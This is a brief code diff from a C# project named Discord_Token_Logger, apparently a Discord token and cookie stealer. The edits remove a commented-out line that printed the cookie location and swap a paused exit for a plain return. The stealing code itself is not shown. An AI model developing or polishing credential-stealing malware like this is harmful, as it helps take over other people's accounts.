@@ -37,7 +37,6 @@ namespace Discord_Token_Logger
                     File.WriteAllText(CheckToken, "Created");
                 }
 
-                //Console.WriteLine(CookieLoc);
 
                 try
                 {
@@ -81,7 +80,7 @@ namespace Discord_Token_Logger
 
                 }
                 
-                ///Console.ReadLine();
+                return;
             }
         }
 
